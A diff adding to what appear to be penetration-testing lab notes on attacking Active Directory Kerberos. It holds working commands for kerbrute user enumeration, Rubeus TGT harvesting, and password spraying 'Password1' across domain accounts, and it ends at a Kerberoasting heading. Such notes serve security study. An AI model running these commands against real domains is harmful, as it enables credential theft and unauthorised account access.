@@ -43,3 +43,14 @@
 ./TOOLS/kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local /home/kali/TOOLS/Active-Directory-Wordlists/User.txt
 ```
 # Harvesting & Brute-Forcing Tickets w/ Rubeus
+```
+Rubeus.exe harvest /interval:30 - This command tells Rubeus to harvest for TGTs every 30 seconds
+```
+- Brute-Forcing / Password-Spraying w/ Rubeus
+  - Rubeus can both brute force passwords as well as password spray user accounts
+  - When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account
+  - In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password
+  ```
+  Rubeus.exe brute /password:Password1 /noticket - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
+  ```
+# Kerberoasting w/ Rubeus & Impacket
